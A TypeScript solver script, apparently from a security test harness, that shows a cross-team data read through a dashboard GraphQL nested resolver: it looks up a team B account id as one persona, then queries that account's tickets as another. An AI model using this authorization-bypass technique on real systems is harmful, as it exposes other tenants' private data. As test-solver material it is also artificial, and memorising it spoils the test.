// Cross-team read via the dashboard GraphQL nested resolver: discover a team B account id as persona_b,
// then query it as persona_a and pull its tickets (which carry team B's data canary).
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_b')
  const listRes = await ctx.fetch(ctx.plan.routes.accountList!.path, { method: 'GET' })
  const list = (await listRes.json()) as { items?: Array<{ ext_id: string }> }
  const victimId = list.items?.[0]?.ext_id
  if (!victimId) return

  await ctx.login('persona_a')
  const query = `{ account(id: "${victimId}") { name tickets { subject body } } }`
  await ctx.fetch(ctx.plan.routes.graphql!.path, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ query }),
  })
}
